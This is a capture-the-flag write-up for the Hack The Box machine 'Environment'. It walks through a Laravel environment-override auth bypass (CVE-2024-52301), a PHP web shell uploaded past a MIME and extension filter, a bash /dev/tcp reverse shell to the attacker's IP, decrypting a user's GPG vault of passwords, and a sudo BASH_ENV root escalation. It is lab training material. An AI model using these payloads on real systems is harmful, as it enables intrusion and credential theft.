---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Linux
  - Environment-Manipulation
  - CVE-2024-52301
  - MIME-Type-Bypass
  - File-Upload-Attacks
  - Environment-Variables
  - GPG-Decryption
---
# Overview

| Name        | Environment |
| ----------- | ----------- |
| OS          | Linux       |
| Base Points | Medium [30] |
| Status      | Done        |
# Recon
## Nmap

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ sudo nmap -sC -sV environment.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 08:35 PDT
Nmap scan report for environment.htb (10.10.11.67)
Host is up (0.42s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Save the Environment | environment.htb
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
## Subdomain Enumeration

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://FUZZ.environment.htb \
  -H "Host: FUZZ.environment.htb" \
  -t 50
```

Nothing.
## Directory Enumeration

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ gobuster dir -u http://environment.htb/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://environment.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.bashrc              (Status: 403) [Size: 153]
/.bash_history        (Status: 403) [Size: 153]
/.cvs                 (Status: 403) [Size: 153]
/.forward             (Status: 403) [Size: 153]
/.cvsignore           (Status: 403) [Size: 153]
/.history             (Status: 403) [Size: 153]
/.git                 (Status: 403) [Size: 153]
/.htaccess            (Status: 403) [Size: 153]
/.listing             (Status: 403) [Size: 153]
/.htpasswd            (Status: 403) [Size: 153]
/.passwd              (Status: 403) [Size: 153]
/.perf                (Status: 403) [Size: 153]
/.profile             (Status: 403) [Size: 153]
/.rhosts              (Status: 403) [Size: 153]
/.svn                 (Status: 403) [Size: 153]
/.ssh                 (Status: 403) [Size: 153]
/.subversion          (Status: 403) [Size: 153]
/.web                 (Status: 403) [Size: 153]
/build                (Status: 301) [Size: 169] [--> http://environment.htb/build/]
/favicon.ico          (Status: 200) [Size: 0]
/login                (Status: 200) [Size: 2391]
/logout               (Status: 302) [Size: 358] [--> http://environment.htb/login]
/mailing              (Status: 405) [Size: 244854]
/robots.txt           (Status: 200) [Size: 24]
/storage              (Status: 301) [Size: 169] [--> http://environment.htb/storage/]
/up                   (Status: 200) [Size: 2126]
/upload               (Status: 405) [Size: 244852]
/vendor               (Status: 301) [Size: 169] [--> http://environment.htb/vendor/]
```

Went to `/login`. There was no `/register`. Doesn't seem to have SQLI, So intercepted the request of login and got this request:

```html
POST /login HTTP/1.1
Host: environment.htb
Content-Length: 108
Cache-Control: max-age=0
Origin: http://environment.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.7
Referer: http://environment.htb/login?error=Invalid%20credentials.
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6InpBTnN0Qk1NazFIUzBVVU11V0RDSFE9PSIsInZhbHVlIjoib0NtVmxld1M5Z1NHN3VncHN3WXJCZjRzSmtCcFZHSi9EVXJWdDNha1pnZEZJMHBwSnlsaVlvZ3RoSmo0TC9WQW10dU5YWFJiT3czSlQ2K0pjM0JqTXdFYS9uZG5DN3VhVGo1aHZKQytCdU9Fckx3aTRlUmhFNGZUZk0rckZlTDkiLCJtYWMiOiIxYjdjZTA1N2M5NDYzOWY4YjhhOTlhY2U0NjlhZmM5ZDg5M2IyNjM4YjI2YTM5ZWQ3ZDRmMzgyNTI0YzFlNzllIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImZ0UU1sbktxTno2NjhFeHk3L3pFbFE9PSIsInZhbHVlIjoiaVNZN2hBeHFycHVqSW95RnBmWlVpN1gwTWF3bGJhNVQrbC91cmJVZnhnQitjSCt6ZmhkZDczNXY1bzFhazZYTkFZdjNvSi9GUDEvVXBHWTFzZTFwNUVMWXZ4SUIwMnkxa1orM1dUT2JCU2JDd0NwRXB0K0xLbW8yVVhKcUx3UTAiLCJtYWMiOiJiNDcwNDBiNmUwYzcyNmVmZjUwOTlmNTlmNDcxOWE5YzU5NjZkNjgwOWVmMWM0MDQ4NGIyNGU3YjdjMWIyZWIxIiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=tYrMxrsec2WmTsUHzL3exVzx5Uva96Xqyfhk1gcl&email=AshuraScythe%40gmail.com&password=sdasd&remember=False
```

In `/upload` there seems to be errors that are shown due to app being in production debug mode and due to this also `APP_DEBUG=true`.

![[environment.png]]

Removed the `remember` parameter in request from `/login` and rendered the response:

```html
POST /login HTTP/1.1
Host: environment.htb
Content-Length: 108
Cache-Control: max-age=0
Origin: http://environment.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.7
Referer: http://environment.htb/login?error=Invalid%20credentials.
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6InpBTnN0Qk1NazFIUzBVVU11V0RDSFE9PSIsInZhbHVlIjoib0NtVmxld1M5Z1NHN3VncHN3WXJCZjRzSmtCcFZHSi9EVXJWdDNha1pnZEZJMHBwSnlsaVlvZ3RoSmo0TC9WQW10dU5YWFJiT3czSlQ2K0pjM0JqTXdFYS9uZG5DN3VhVGo1aHZKQytCdU9Fckx3aTRlUmhFNGZUZk0rckZlTDkiLCJtYWMiOiIxYjdjZTA1N2M5NDYzOWY4YjhhOTlhY2U0NjlhZmM5ZDg5M2IyNjM4YjI2YTM5ZWQ3ZDRmMzgyNTI0YzFlNzllIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImZ0UU1sbktxTno2NjhFeHk3L3pFbFE9PSIsInZhbHVlIjoiaVNZN2hBeHFycHVqSW95RnBmWlVpN1gwTWF3bGJhNVQrbC91cmJVZnhnQitjSCt6ZmhkZDczNXY1bzFhazZYTkFZdjNvSi9GUDEvVXBHWTFzZTFwNUVMWXZ4SUIwMnkxa1orM1dUT2JCU2JDd0NwRXB0K0xLbW8yVVhKcUx3UTAiLCJtYWMiOiJiNDcwNDBiNmUwYzcyNmVmZjUwOTlmNTlmNDcxOWE5YzU5NjZkNjgwOWVmMWM0MDQ4NGIyNGU3YjdjMWIyZWIxIiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=tYrMxrsec2WmTsUHzL3exVzx5Uva96Xqyfhk1gcl&email=AshuraScythe%40gmail.com&password=sdasd
```

![[environment2.png]]

I forwarded this request: (I was trying to do LFI LoL)

```html
POST /login HTTP/1.1
Host: environment.htb
Content-Length: 108
Cache-Control: max-age=0
Origin: http://environment.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.7
Referer: http://environment.htb/login?error=Invalid%20credentials.
Accept-Encoding: gzip, deflate, br
Cookie: XSRF-TOKEN=eyJpdiI6InpBTnN0Qk1NazFIUzBVVU11V0RDSFE9PSIsInZhbHVlIjoib0NtVmxld1M5Z1NHN3VncHN3WXJCZjRzSmtCcFZHSi9EVXJWdDNha1pnZEZJMHBwSnlsaVlvZ3RoSmo0TC9WQW10dU5YWFJiT3czSlQ2K0pjM0JqTXdFYS9uZG5DN3VhVGo1aHZKQytCdU9Fckx3aTRlUmhFNGZUZk0rckZlTDkiLCJtYWMiOiIxYjdjZTA1N2M5NDYzOWY4YjhhOTlhY2U0NjlhZmM5ZDg5M2IyNjM4YjI2YTM5ZWQ3ZDRmMzgyNTI0YzFlNzllIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImZ0UU1sbktxTno2NjhFeHk3L3pFbFE9PSIsInZhbHVlIjoiaVNZN2hBeHFycHVqSW95RnBmWlVpN1gwTWF3bGJhNVQrbC91cmJVZnhnQitjSCt6ZmhkZDczNXY1bzFhazZYTkFZdjNvSi9GUDEvVXBHWTFzZTFwNUVMWXZ4SUIwMnkxa1orM1dUT2JCU2JDd0NwRXB0K0xLbW8yVVhKcUx3UTAiLCJtYWMiOiJiNDcwNDBiNmUwYzcyNmVmZjUwOTlmNTlmNDcxOWE5YzU5NjZkNjgwOWVmMWM0MDQ4NGIyNGU3YjdjMWIyZWIxIiwidGFnIjoiIn0%3D
Connection: keep-alive

_token=tYrMxrsec2WmTsUHzL3exVzx5Uva96Xqyfhk1gcl&email=AshuraScythe%40gmail.com&password=sdasd&remember=../../../etc/passwd
```

Don't ask me why, and I got this page when I forwarded the request from Burp.

![[environment3.png]]

This part stands out:

```php
    if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
        $request->session()->regenerate();
        $request->session()->put('user_id', 1);
        return redirect('/management/dashboard');
    }
```
# Exploitation
## Environment Manipulation due to Query String CVE-2024-52301 

While searching for `Laravel 11.30.0 Exploits` I found [this](https://github.com/Nyamort/CVE-2024-52301). If the Laravel application **believes** it is running in the `"preprod"` environment, then **anyone** can be auto-logged in as the user with `id = 1`. That’s usually the **admin**. So we can add this parameter `/login?--env=preprod`

- Laravel sees `--env=preprod` via `$_SERVER['argv']`.
- `App::environment()` becomes `"preprod"`.
- Your login attempt **bypasses auth logic** and sets session as `user_id = 1`.

![[environment4.png]]
## MIME Type Bypass 

Now we can login and redirects to `/management/dashboard`. We can change our Profile picture at `http://environment.htb/management/profile`. Since its a `PHP` site we can try to upload web shell. If I upload directly `.php` file we will get `Invalid file detected` .

![[environment5.png]]

We can try MIME-Type file upload attack. `Multipurpose Internet Mail Extensions (MIME)` is an internet standard that determines the type of a file through its general format and bytes structure.

This is usually done by inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime). For example, if a file starts with (`GIF87a` or `GIF89a`), this indicates that it is a `GIF` image, while a file starting with plaintext is usually considered a `Text` file. If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ echo "this is a text file" > text.jpg

┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ file text.jpg
text.jpg: ASCII text

┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ echo "GIF8" > text.jpg

┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ file text.jpg
text.jpg: GIF image data
```

Now we can upload `text.jpg` and intercept the request. I added this web shell below and also changed name from `text.jpg` to `shells.php`:

```php
<?php system($_GET['cmd']); ?>
```

and also uploading only by changing MIME type also gave `Invalid file detected`  due to `.php` extension and vice versa. So I changed the `shells.php` to `shells.php.`  to bypass it (Other extensiosn might have also worked you can fuzz them.) ``

![[environment6.png]]

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ curl http://environment.htb/storage/files/shells.php?cmd=id
GIF8
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can try Reverse Shell.

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ curl 'http://environment.htb/storage/files/shells.php?cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.160/4444+0>%261"'
```

```bash
PS C:\Users\At0m\Temp\nc.exe> .\nc.exe -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.160] from (UNKNOWN) [10.10.11.67] 44978
bash: cannot set terminal process group (918): Inappropriate ioctl for device
bash: no job control in this shell
www-data@environment:~/app/storage/app/public/files$ ls
ls
bethany.png
hish.png
jono.png
shells.php
www-data@environment:~/app/storage/app/public/files$ cd /home
cd /home
www-data@environment:/home$ ls
ls
hish
www-data@environment:/home$ cd hish
cd hish
www-data@environment:/home/hish$ ls
ls
backup
exp.sh
user.txt
www-data@environment:/home/hish$ cat user.txt
cat user.txt
<REDACTED>
```
# Privilege Escalation
## Decrypting GPG 

```bash
www-data@environment:/home/hish$ cd backup
cd backup
www-data@environment:/home/hish/backup$ ls
ls
keyvault.gpg
www-data@environment:/home/hish/backup$
```

`keyvault.gpg` is encrypted we have to decrypt it.

```bash
www-data@environment:/home/hish$ ls -la
ls -la
total 40
drwxr-xr-x 5 hish hish 4096 Aug  5 01:03 .
drwxr-xr-x 3 root root 4096 Jan 12  2025 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4096 Aug  5 03:48 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
-rwxr-xr-x 1 hish hish    8 Aug  5 01:03 exp.sh
-rw-r--r-- 1 root hish   33 Aug  4 20:02 user.txt
www-data@environment:/home/hish$ cd .gnupg
cd .gnupg
www-data@environment:/home/hish/.gnupg$ ls
ls
openpgp-revocs.d   pubring.kbx   random_seed
private-keys-v1.d  pubring.kbx~  trustdb.gpg
www-data@environment:/home/hish/.gnupg$
```

- `private-keys-v1.d/` → contains **private key data**
- `pubring.kbx` → contains **public keys**
- `trustdb.gpg` → trust model data
- This means we **can probably decrypt `keyvault.gpg`** without needing to crack anything — unless it’s passphrase-protected.

```bash
www-data@environment:/home/hish$ cp -r .gnupg /tmp/mygpg
cp -r .gnupg /tmp/mygpg
www-data@environment:/home/hish$ cd /tmp/mygpg
cd /tmp/mygpg
www-data@environment:/tmp/mygpg$ ls
ls
openpgp-revocs.d   pubring.kbx   random_seed
private-keys-v1.d  pubring.kbx~  trustdb.gpg
www-data@environment:/tmp/mygpg$ ls -la
ls -la
total 32
drwxr-xr-x  4 www-data www-data 4096 Aug  5 04:22 .
drwxrwxrwt 10 root     root     4096 Aug  5 04:22 ..
drwxr-xr-x  2 www-data www-data 4096 Aug  5 04:22 openpgp-revocs.d
drwxr-xr-x  2 www-data www-data 4096 Aug  5 04:22 private-keys-v1.d
-rwxr-xr-x  1 www-data www-data 1446 Aug  5 04:22 pubring.kbx
-rwxr-xr-x  1 www-data www-data   32 Aug  5 04:22 pubring.kbx~
-rwxr-xr-x  1 www-data www-data  600 Aug  5 04:22 random_seed
-rwxr-xr-x  1 www-data www-data 1280 Aug  5 04:22 trustdb.gpg
```

Change permission first to `700` so that this directory can't be used by others otherwise it won't work or refuse to work.

```bash
www-data@environment:/tmp/mygpg$ chmod -R 700 /tmp/mygpg
chmod -R 700 /tmp/mygpg
www-data@environment:/tmp/mygpg$ ls -la
ls -la
total 32
drwx------  4 www-data www-data 4096 Aug  5 04:22 .
drwxrwxrwt 10 root     root     4096 Aug  5 04:22 ..
drwx------  2 www-data www-data 4096 Aug  5 04:22 openpgp-revocs.d
drwx------  2 www-data www-data 4096 Aug  5 04:22 private-keys-v1.d
-rwx------  1 www-data www-data 1446 Aug  5 04:22 pubring.kbx
-rwx------  1 www-data www-data   32 Aug  5 04:22 pubring.kbx~
-rwx------  1 www-data www-data  600 Aug  5 04:22 random_seed
-rwx------  1 www-data www-data 1280 Aug  5 04:22 trustdb.gpg
```

List **secret/private keys** stored in the GPG keyring directory `/tmp/mygnupg`.

```bash
www-data@environment:/tmp/mygpg$ gpg --homedir /tmp/mygpg --list-secret-keys
gpg --homedir /tmp/mygpg --list-secret-keys
/tmp/mygpg/pubring.kbx
----------------------
sec   rsa2048 2025-01-11 [SC]
      F45830DFB638E66CD8B752A012F42AE5117FFD8E
uid           [ultimate] hish_ <hish@environment.htb>
ssb   rsa2048 2025-01-11 [E]
```

First check if there is passphrase or not in private key.

```bash
www-data@environment:/tmp/mygpg$ gpg --homedir /tmp/mygpg --output /tmp/decrypted.txt --decrypt /home/hish/backup/keyvault.gpg
<rypted.txt --decrypt /home/hish/backup/keyvault.gpg
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
www-data@environment:/tmp/mygpg$
```

Since no password entering prompt is shown it doesn't have passphrase and we should be able to get decrypted content in `/tmp/mygpg`.

```bash
www-data@environment:/tmp/mygpg$ cat /tmp/decrypted.txt
cat /tmp/decrypted.txt
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

Now SSH into `hish:marineSPm@ster!!`.
## Environment Variable Misconfiguration

```bash
┌──(at0m㉿DESKTOP-HSPMATJ)-[~]
└─$ ssh hish@environment.htb
<SNIP>
hish@environment:~$ ls
backup  exp.sh  user.txt
hish@environment:~$ sudo -l
[sudo] password for hish:
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
hish@environment:~$
```

`sudo` resets almost all environment variables (**env_reset**), but sudoers left an exception `env_keep+="ENV BASH_ENV"`.  That means even when running `sudo`, you can **pass in your own environment variables** `ENV` and `BASH_ENV`.

`/usr/bin/systeminfo` it's just bash script.

```bash
hish@environment:~$ cat  /usr/bin/systeminfo
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
```
### What is `BASH_ENV`?

- Normally, when Bash is launched **non-interactively** (e.g., to run a script), it:
    
    - **does not source `.bashrc`**
    - **but** it will source the file pointed to by the `BASH_ENV` environment variable.

So if you run:

```bash
BASH_ENV=/tmp/rootme.sh bash script.sh
```

Then `/tmp/rootme.sh` is sourced **before** `script.sh` runs and when we do this:

```bash
sudo BASH_ENV=/tmp/rootme.sh /usr/bin/systeminfo
```

- You're telling `sudo`:
    
    - Run `systeminfo` (which is a Bash script) as root
    - But **keep the `BASH_ENV` variable**
    
- Bash runs `systeminfo` as root, **and first sources** `/tmp/rootme.sh` 
- If `/tmp/rootme.sh` contains something like `bash -p`, it **spawns a root shell**.

Okay then lets get to exploit:

```bash
hish@environment:~$ echo 'bash -p' > /tmp/rootme.sh
chmod +x /tmp/rootme.sh
hish@environment:~$ sudo BASH_ENV=/tmp/rootme.sh /usr/bin/systeminfo
root@environment:/home/hish# id
uid=0(root) gid=0(root) groups=0(root)
root@environment:/home/hish# cat /root/root.txt
<REDACTED>
```

---



